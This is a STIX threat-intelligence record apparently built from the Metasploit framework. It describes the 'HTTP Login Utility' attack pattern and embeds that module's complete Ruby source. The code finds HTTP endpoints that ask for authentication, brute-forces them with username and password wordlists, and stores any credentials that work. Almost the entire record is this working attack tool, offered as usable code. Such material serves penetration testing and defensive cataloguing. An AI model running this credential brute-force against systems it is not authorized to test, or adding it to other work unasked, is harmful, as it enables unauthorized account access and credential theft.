{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--9a70f820-638a-4238-b30f-c880bb3395d9",
    "created": "2024-08-14T16:29:04.562894Z",
    "modified": "2024-08-14T16:29:04.562898Z",
    "name": "HTTP Login Utility",
    "description": "This module attempts to authenticate to an HTTP service.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/http_login.rb",
            "external_id": "http_login.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0502#Weakpassword"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasploit/framework/credential_collection'\nrequire 'metasploit/framework/login_scanner/http'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::AuthBrute\n\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'           => 'HTTP Login Utility',\n      'Description'    => 'This module attempts to authenticate to an HTTP service.',\n      'Author'         => [ 'hdm' ],\n      'References'     =>\n        [\n          [ 'CVE', '1999-0502'] # Weak password\n        ],\n      'License'        => MSF_LICENSE,\n      # See https://github.com/rapid7/metasploit-framework/issues/3811\n      #'DefaultOptions' => {\n      #  'USERPASS_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_userpass.txt\"),\n      #  'USER_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\"),\n      #  'PASS_FILE' => File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\"),\n      #}\n    )\n\n    register_options(\n      [\n        OptPath.new('USERPASS_FILE',  [ false, \"File containing users and passwords separated by space, one pair per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_userpass.txt\") ]),\n        OptPath.new('USER_FILE',  [ false, \"File containing users, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_users.txt\") ]),\n        OptPath.new('PASS_FILE',  [ false, \"File containing passwords, one per line\",\n          File.join(Msf::Config.data_directory, \"wordlists\", \"http_default_pass.txt\") ]),\n        OptString.new('AUTH_URI', [ false, \"The URI to authenticate against (default:auto)\" ]),\n        OptString.new('REQUESTTYPE', [ false, \"Use HTTP-GET or HTTP-PUT for Digest-Auth, PROPFIND for WebDAV (default:GET)\", \"GET\" ])\n      ])\n    register_autofilter_ports([ 80, 443, 8080, 8081, 8000, 8008, 8443, 8444, 8880, 8888 ])\n\n    register_advanced_options(\n      [\n        OptString.new('HttpSuccessCodes', [ false, 'Comma seperated list of HTTP response codes or ranges to promote as successful login', '200,201,300-308']),\n      ]\n    )\n\n    deregister_options('USERNAME', 'PASSWORD', 'PASSWORD_SPRAY')\n  end\n\n  def to_uri(uri)\n    begin\n      # In case TARGETURI is empty, at least we default to '/'\n      uri = \"/\" if uri.blank?\n      URI(uri)\n    rescue ::URI::InvalidURIError\n      raise RuntimeError, \"Invalid URI: #{uri}\"\n    end\n  end\n\n  def find_auth_uri\n    if datastore['AUTH_URI'].present?\n      paths = [datastore['AUTH_URI']]\n    else\n      paths = %W{\n        /\n        /admin/\n        /auth/\n        /manager/\n        /Management.asp\n        /ews/\n      }\n    end\n\n    paths.each do |path|\n      uri = ''\n\n      begin\n        uri = to_uri(path)\n      rescue RuntimeError => e\n        # Bad URI so we will not try to request it\n        print_error(e.message)\n        next\n      end\n\n      uri = normalize_uri(uri.path)\n\n      res = send_request_cgi({\n        'uri'     => uri,\n        'method'  => datastore['REQUESTTYPE'],\n        'username' => '',\n        'password' => ''\n      }, 10)\n\n      next unless res\n      if res.redirect? && res.headers['Location'] && res.headers['Location'] !~ /^http/\n        path = res.headers['Location']\n        vprint_status(\"Following redirect: #{path}\")\n        res = send_request_cgi({\n          'uri'     => path,\n          'method'  => datastore['REQUESTTYPE'],\n          'username' => '',\n          'password' => ''\n        }, 10)\n        next if not res\n      end\n      next unless res.code == 401\n\n      return path\n    end\n\n    return nil\n  end\n\n  def target_url\n    proto = \"http\"\n    if rport == 443 or ssl\n      proto = \"https\"\n    end\n    \"#{proto}://#{vhost}:#{rport}#{@uri.to_s}\"\n  end\n\n  def run_host(ip)\n    if (datastore['REQUESTTYPE'] == \"PUT\") && (datastore['AUTH_URI'].blank?)\n      print_error(\"You need need to set AUTH_URI when using PUT Method !\")\n      return\n    end\n\n    extra_info = \"\"\n    if rhost != vhost\n      extra_info = \" (#{rhost})\"\n    end\n\n    @uri = find_auth_uri\n    if ! @uri\n      print_error(\"#{target_url}#{extra_info} No URI found that asks for HTTP authentication\")\n      return\n    end\n\n    @uri = \"/#{@uri}\" if @uri[0,1] != \"/\"\n\n    print_status(\"Attempting to login to #{target_url}#{extra_info}\")\n\n    cred_collection = build_credential_collection(\n      username: datastore['HttpUsername'],\n      password: datastore['HttpPassword']\n    )\n\n    begin\n      success_codes = parse_http_success_codes(datastore['HttpSuccessCodes'])\n    rescue ArgumentError => e\n      fail_with(Msf::Exploit::Failure::BadConfig, \"HttpSuccessCodes in invalid: #{e.message}\")\n    end\n\n    scanner = Metasploit::Framework::LoginScanner::HTTP.new(\n      configure_http_login_scanner(\n        uri: @uri,\n        method: datastore['REQUESTTYPE'],\n        cred_details: cred_collection,\n        stop_on_success: datastore['STOP_ON_SUCCESS'],\n        bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n        http_success_codes: success_codes,\n        connection_timeout: 5\n      )\n    )\n\n    msg = scanner.check_setup\n    if msg\n      print_brute :level => :error, :ip => ip, :msg => \"Verification failed: #{msg}\"\n      return\n    end\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n      when Metasploit::Model::Login::Status::SUCCESSFUL\n        print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}'\"\n        credential_data[:private_type] = :password\n        credential_core = create_credential(credential_data)\n        credential_data[:core] = credential_core\n        create_credential_login(credential_data)\n        :next_user\n      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Could not connect\"\n        end\n        invalidate_login(credential_data)\n        :abort\n      when Metasploit::Model::Login::Status::INCORRECT\n        if datastore['VERBOSE']\n          print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n        end\n        invalidate_login(credential_data)\n      end\n    end\n\n  end\n\n  private\n  def parse_http_success_codes(codes_string)\n    codes = []\n    parts = codes_string.split(',')\n    parts.each do |code|\n      code_parts = code.split('-')\n      if code_parts.length > 1\n        int_start = code_parts[0].to_i\n        int_end = code_parts[1].to_i\n        unless int_start > 0 && int_end > 0\n          raise ArgumentError.new(\"#{code} is not a valid response code range.\")\n        end\n        codes.append(*(int_start..int_end))\n      else\n        int_code = code.to_i\n        unless int_code > 0\n          raise ArgumentError.new(\"#{code} is not a valid response code.\")\n        end\n        codes << int_code\n      end\n    end\n    codes\n  end\n\nend\n"
}